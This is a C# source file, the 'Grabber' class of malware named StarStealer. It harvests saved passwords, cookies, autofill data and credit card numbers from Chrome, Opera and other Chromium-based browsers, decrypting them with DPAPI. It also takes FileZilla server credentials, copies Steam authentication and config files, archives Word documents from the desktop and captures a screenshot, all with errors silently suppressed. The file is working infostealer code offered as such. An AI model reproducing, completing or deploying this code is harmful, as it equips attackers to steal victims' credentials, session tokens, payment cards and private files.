using System;
using System.Collections.Generic;
using System.Text;
using StarStealer.Models;
using StarStealer.APIs;
using System.IO;
using System.Text.RegularExpressions;
using System.IO.Compression;
using System.Drawing;
using Microsoft.Win32;

namespace StarStealer.Utilities
{
    class Grabber
    {
        private static string LocalAppData = Environment.GetEnvironmentVariable("LocalAppData");
        private static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static List<string> LoginDataPaths = new List<string>
        {
                LocalAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                ApplicationData + "\\Opera Software\\Opera Stable\\Login Data",
                LocalAppData + "\\Kometa\\User Data\\Default\\Login Data",
                LocalAppData + "\\Orbitum\\User Data\\Default\\Login Data",
                LocalAppData + "\\Comodo\\Dragon\\User Data\\Default\\Login Data",
                LocalAppData + "\\Amigo\\User\\User Data\\Default\\Login Data",
                LocalAppData + "\\Torch\\User Data\\Default\\Login Data"
        };
        private static List<string> CookiesDataPaths = new List<string>
        {
                LocalAppData + "\\Google\\Chrome\\User Data\\Default\\Cookies",
                ApplicationData + "\\Opera Software\\Opera Stable\\Cookies",
                LocalAppData + "\\Kometa\\User Data\\Default\\Cookies",
                LocalAppData + "\\Orbitum\\User Data\\Default\\Cookies",
                LocalAppData + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
                LocalAppData + "\\Amigo\\User\\User Data\\Default\\Cookies",
                LocalAppData + "\\Torch\\User Data\\Default\\Cookies"
        };
        private static List<string> WebDataPaths = new List<string>
        {
                LocalAppData + "\\Google\\Chrome\\User Data\\Default\\Web Data",
                ApplicationData + "\\Opera Software\\Opera Stable\\Web Data",
                LocalAppData + "\\Kometa\\User Data\\Default\\Web Data",
                LocalAppData + "\\Orbitum\\User Data\\Default\\Web Data",
                LocalAppData + "\\Comodo\\Dragon\\User Data\\Default\\Web Data",
                LocalAppData + "\\Amigo\\User\\User Data\\Default\\Web Data",
                LocalAppData + "\\Torch\\User Data\\Default\\Web Data"
        };
        private static StealedData StealedData = new StealedData();
        private static List<Browser> Browsers = new List<Browser>();
        private static List<String> Bad = new List<string> { "id", "ev", "dl", "if", "sw", "sh", "v", "r", "ec", "o", "it", "dl", "ts", "it" };
        private static void Parser()
        {
            try
            {
                string desc = "";
                foreach (var Browser in Browsers)
                {
                    foreach (var path in LoginDataPaths)
                    {
                        if (!File.Exists(path))
                            continue;
                        SqlHandler sqlHandler = new SqlHandler(path);
                        sqlHandler.ReadTable("logins");
                        for (int rowNum = 0; rowNum < sqlHandler.GetRowCount(); ++rowNum)
                        {
                            Browser.Passwords.Add(new PasswordData
                            {
                                URL = sqlHandler.GetValue(rowNum, 0),
                                UserName = sqlHandler.GetValue(rowNum, 3),
                                PasswordValue = Encoding.UTF8.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(sqlHandler.GetValue(rowNum, 5)), new byte[0], out desc))
                            });
                        }
                    }
                }
                foreach (var Browser in Browsers)
                {
                    foreach (var path in CookiesDataPaths)
                    {
                        if (!File.Exists(path))
                            continue;
                        SqlHandler sqlHandler = new SqlHandler(path);
                        sqlHandler.ReadTable("cookies");
                        for (int rowNum = 0; rowNum < sqlHandler.GetRowCount(); ++rowNum)
                        {
                            Browser.Cookies.Add(new Cookie
                            {
                                Host = sqlHandler.GetValue(rowNum, 1),
                                Value = Encoding.UTF8.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(sqlHandler.GetValue(rowNum, 12)), new byte[0], out desc)),
                                Name = sqlHandler.GetValue(rowNum, 2),
                                ExpiresUTC = sqlHandler.GetValue(rowNum, 5),
                            });
                        }
                    }
                }
                foreach (var Browser in Browsers)
                {
                    foreach (var path in WebDataPaths)
                    {
                        if (!File.Exists(path))
                            continue;
                        SqlHandler sqlHandler = new SqlHandler(path);
                        sqlHandler.ReadTable("autofill");
                        for (int rowNum = 0; rowNum < sqlHandler.GetRowCount(); ++rowNum)
                        {
                            string value = sqlHandler.GetValue(rowNum, 0);
                            if (Bad.Contains(value.ToLower()) || value.ToLower().Contains("cd[") || value == null)
                                continue;
                            Browser.AutoFill.Add(new AutoFill
                            {
                                TextBox = value,
                                Value = sqlHandler.GetValue(rowNum, 1)
                            });
                        }
                    }
                }
                foreach (var Browser in Browsers)
                {
                    foreach (var path in WebDataPaths)
                    {
                        if (!File.Exists(path))
                            continue;
                        SqlHandler sqlHandler = new SqlHandler(path);
                        sqlHandler.ReadTable("credit_cards");
                        for (int rowNum = 0; rowNum < sqlHandler.GetRowCount(); ++rowNum)
                        {
                            Browser.CreditCards.Add(new CreditCard
                            {
                                Holder = sqlHandler.GetValue(rowNum, 1),
                                Number = Encoding.UTF8.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(sqlHandler.GetValue(rowNum, 4)), new byte[0], out desc)),
                                ValidDate = $"{sqlHandler.GetValue(rowNum, 2)}/{sqlHandler.GetValue(rowNum, 3)}"
                            });
                        }
                    }
                }
            }
            catch
            {

            }
        }
        public static void Grab(ref User user)
        {
            try
            {
                string BrowserName = "";
                foreach (var path in LoginDataPaths)
                {
                    if (File.Exists(path))
                    {
                        if (path.Contains("Chrome"))
                            BrowserName = "Google Chrome";
                        if (path.Contains("Orbitum"))
                            BrowserName = "Orbitum Browser";
                        if (path.Contains("Opera"))
                            BrowserName = "Opera Browser";
                        if (path.Contains("Amigo"))
                            BrowserName = "Amigo Browser";
                        if (path.Contains("Torch"))
                            BrowserName = "Torch Browser";
                        if (path.Contains("Comodo"))
                            BrowserName = "Comodo Browser";
                        Browsers.Add(new Browser
                        {
                            BrowserName = BrowserName,
                            Passwords = new List<PasswordData>(),
                            CreditCards = new List<CreditCard>(),
                            AutoFill = new List<AutoFill>(),
                            Cookies = new List<Cookie>()
                        });
                    }
                }
                Parser();
                foreach (var Browser in Browsers)
                {
                    StealedData.BrowsersData = Browsers;
                }
                user.StealedData = StealedData;
                GetFilezilla(ref user);
                GrabScreen(ref user);
                GetDesktop(ref user);
                GetSteam(ref user);
                user.Date = DateTime.Now.ToShortDateString() + " | " + DateTime.Now.ToShortTimeString();
            }
            catch
            {

            }

        }
        private static void GetFilezilla(ref User user)
        {
            try
            {
                user.StealedData.FileZillaData = new List<PasswordData>();
                string path = ApplicationData + "\\FileZilla\\recentservers.xml";
                if (!File.Exists(path))
                    return;
                if (File.Exists(ApplicationData + "\\FileZilla.txt"))
                    File.Delete(ApplicationData + "\\FileZilla.txt");
                using (FileStream fs = new FileStream(path, FileMode.Open))
                {
                    StreamReader sr = new StreamReader(fs);
                    Regex regex1 = new Regex("<Host>(.*)</Host>");
                    Regex regex2 = new Regex("<User>(.*)</User>");
                    Regex regex3 = new Regex("<Pass encoding=\"base64\">(.*)</Pass>");
                    string host = String.Empty;
                    string usr = String.Empty;
                    string pass = String.Empty;
                    string input;
                    while ((input = sr.ReadLine()) != null)
                    {
                        Match match1 = regex1.Match(input);
                        Match match2 = regex2.Match(input);
                        Match match3 = regex3.Match(input);
                        if (match1.Groups[1].ToString() != "")
                            host = match1.Groups[1].ToString();
                        if (match2.Groups[1].ToString() != "")
                            usr = match2.Groups[1].ToString();
                        if (match3.Groups[1].ToString() != "")
                            pass = Encoding.UTF8.GetString(Convert.FromBase64String(match3.Groups[1].ToString()));
                        if (!String.IsNullOrWhiteSpace(host) && !String.IsNullOrWhiteSpace(usr) && !String.IsNullOrWhiteSpace(pass))
                        {
                            user.StealedData.FileZillaData.Add(new PasswordData
                            {
                                URL = host,
                                UserName = usr,
                                PasswordValue = pass
                            });
                            host = String.Empty;
                            usr = String.Empty;
                            pass = String.Empty;
                        }
                    }
                    sr.Close();
                }
            }
            catch
            {

            }

        }
        private static bool GetSteam(ref User user)
        {
            try
            {
                string steamstealedpath = $"{ApplicationData}\\{user.Hwid}\\SteamData";
                string stp = Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "Steampath", null).ToString();
                StringBuilder builder = new StringBuilder();
                string steampath = String.Empty;
                foreach (var c in stp)
                {
                    if (c.Equals('/'))
                    {
                        builder.Append(@"\");
                    }
                    else
                        builder.Append(c);
                }
                steampath = builder.ToString();
                if (!Directory.Exists(steampath))
                    return false;
                Directory.CreateDirectory(steamstealedpath);
                var fls = Directory.GetFiles(steampath, "ssfn*");
                foreach (string file in fls)
                {
                    string fileName = Path.GetFileName(file);
                    File.Copy(file, Path.Combine(steamstealedpath, fileName), true);
                }
                if (File.Exists(steampath + "\\config\\config.vdf"))
                    File.Copy(steampath + "\\config\\config.vdf", steamstealedpath + "\\config.vdf");
                if (File.Exists(steampath + "\\config\\loginusers.vdf"))
                    File.Copy(steampath + "\\config\\loginusers.vdf", steamstealedpath + "\\loginusers.vdf");
                if (File.Exists(steampath + "\\config\\SteamAppData.vdf"))
                    File.Copy(steampath + "\\config\\SteamAppData.vdf", steamstealedpath + "\\SteamAppData.vdf");
                return true;
            }
            catch
            {
                return false;
            }
        }
        private static void GetDesktop(ref User user)
        {
            try
            {
                int counter = 0;
                string str1 = ApplicationData + "\\Desktop";
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string archivepath = $"{ApplicationData}\\{user.Hwid}\\Desktop.zip";
                DirectoryInfo directoryInfo = new DirectoryInfo(path);
                List<string> stringList = new List<string>() { ".doc", ".docx" };
                Directory.CreateDirectory(str1);
                Directory.GetFiles(path, "*.*", SearchOption.AllDirectories);
                foreach (FileInfo file in directoryInfo.GetFiles("*.*", SearchOption.AllDirectories))
                {
                    foreach (string str2 in stringList)
                    {
                        if (file.FullName.Contains(str2) && !File.Exists(str1 + "\\" + file.Name))
                        {
                            counter++;
                            File.Copy(file.FullName, str1 + "\\" + file.Name);
                        }
                    }
                }
                user.StealedData.DesktopArchiveCount = counter;
                if (!File.Exists(archivepath))
                    ZipFile.CreateFromDirectory(str1, archivepath, CompressionLevel.Fastest, false);
            }
            catch
            {

            }
        }
        private static void GrabScreen(ref User user)
        {
            try
            {
                Bitmap Screenshot;
                int width = int.Parse(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width.ToString());
                int height = int.Parse(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width.ToString());
                Screenshot = new Bitmap(1920, 1080);
                Size s = new Size(Screenshot.Width, Screenshot.Height);
                Graphics memoryGraphics = Graphics.FromImage(Screenshot);
                memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
                string screenpath = $"{ApplicationData}\\{user.Hwid}\\ScreenShot.png";
                Screenshot.Save(screenpath);
            }
            catch
            {

            }
        }
    }
}